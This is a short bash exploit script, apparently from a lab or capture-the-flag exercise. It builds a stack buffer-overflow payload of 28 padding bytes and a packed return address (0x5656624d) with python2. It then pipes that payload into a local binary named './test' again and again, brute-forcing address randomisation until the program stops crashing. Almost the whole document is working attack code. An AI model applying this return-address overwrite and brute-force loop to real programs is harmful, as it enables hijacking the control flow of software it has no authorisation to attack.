#!/bin/bash

str=`python2 -c "import struct; print('AAAABBBBCCCCDDDDEEEEFFFFGGGG' + struct.pack('I', 0x5656624d))"` # one of the possible addresses 0x56###20d, original 5655624d
i=1

while [ $? -ne 1 ]; do
    echo $str;
    variable=$(echo $str | ./test);
    len=${#variable};
    if [ $len -eq 0 ]; then
        echo "It crashed! Try Again..."
    else
	printf "$variable"
	printf "\n\n\nWe did it... Possibly... After $i tries...\n"
	exit 1
    fi
    i=$(($i + 1))
done
